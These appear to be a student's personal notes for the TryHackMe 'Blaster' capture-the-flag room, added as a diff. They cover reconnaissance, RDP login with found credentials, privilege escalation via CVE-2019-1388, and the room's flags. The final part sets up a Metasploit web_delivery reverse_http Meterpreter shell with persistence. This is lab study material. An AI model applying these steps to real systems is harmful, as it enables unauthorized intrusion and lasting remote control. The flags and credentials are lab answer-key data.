@@ -1,0 +1,58 @@
+Name : Padsala Tushal
+Date : 17/11/2021
+Machine : Blaster
+
+
+-Reconnaissance
+		-nmap
+			-port 80 http web server
+			-port 3389 microsoft wbt server
+
+		-gobuster
+			-/retro
+				username : wade
+
+			-after reading some stupid post of website 
+			-in ready-player-one post someone comment 
+				Leaving myself a note here just in case I forget how to spell it: parzival
+
+			-parzival is password verify throgh thm question
+
+	 	-with nmap scan result we know that there is port 3389 open that is rdp port 
+	 	-let's try to connect with rdp
+	 	-note: we need to also spacify port in remmina otherwise it didn't work
+
+
+
+-user flag
+	-after connection with rdp
+	THM{HACK_PLAYER_ONE}
+
+	-looking in browser histroy
+		CVE-2019-1388
+
+	-hhupd file in desktop
+	-run hhupd with administrator
+	-can't have password for administrator
+	-show more information about certifiate
+	-view in internet explorer 
+	-save this web page
+	-navigate to c:\windows\system32
+	-in path bar type cmd.exe so run cmd
+
+	-the program asking for password for run as administrator is also running as administrator so we can view certifite then internet explorer is also open as administrator privilege and with it save feature we can goto file system and run cmd since all those process run as administrator our cmd is running as adminstrator
+
+-root flag
+	THM{COIN_OPERATED_EXPLOITATION}
+
+
+-get remote shell
+	-use exploit/multi/script/web_delivery
+	-show options
+	-set LHOST tun0
+	-show targets
+	-set target 2(powershell)
+	-show options
+	-set payload windows/meterpreter/reverse_http
+	-run persistence -X
+	
